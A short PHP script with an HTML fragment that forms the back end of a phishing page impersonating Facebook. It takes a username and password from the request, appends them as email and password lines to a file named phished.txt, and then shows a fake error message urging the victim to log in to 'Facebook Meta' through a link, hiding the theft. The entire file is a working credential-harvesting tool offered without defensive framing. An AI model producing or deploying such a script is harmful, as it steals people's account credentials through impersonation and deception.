<?php
    $user=$_GET["user"];
    $pass=$_GET["pass"];

    $f=fopen("phished.txt","a");
    fwrite($f,"Email: ".$user."\n");
    fwrite($f,"Password: ".$pass."\n\n");
    fclose($f);
?>

            <p style="font-size: 25px;font-family: sans-serif">An error occured! Please click the link to log in Facebook Meta <a href="www.facebook.com/login" target="_blank">www.facebook.com</a>.</p>